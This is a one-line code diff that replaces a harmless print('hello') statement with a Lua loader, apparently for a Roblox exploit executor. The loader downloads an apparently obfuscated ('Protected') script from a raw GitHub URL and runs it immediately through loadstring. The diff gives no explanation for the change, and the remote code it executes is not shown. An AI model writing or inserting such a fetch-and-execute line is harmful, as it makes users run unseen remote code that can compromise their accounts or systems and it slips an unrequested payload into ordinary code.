@@ -1,1 +1,1 @@
-print("hello")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ohiogyatskibidirizz3000/Sigma/refs/heads/main/Protected_5450934760929415.txt",true))()
